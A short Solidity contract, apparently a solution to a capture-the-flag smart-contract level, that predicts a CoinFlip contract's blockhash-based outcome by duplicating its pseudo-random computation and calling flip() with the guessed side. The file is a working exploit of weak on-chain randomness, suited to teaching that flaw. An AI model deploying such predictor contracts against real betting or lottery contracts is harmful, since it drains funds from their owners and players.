// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

import "./CoinFlip.sol";

// PRN games can be guessed by duplicating prng code

contract Solution4 {
    CoinFlip public victim;

    constructor(CoinFlip victim_) {
        victim = victim_;
    }

    function attack() external payable {
        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        victim.flip(side);
    }
}
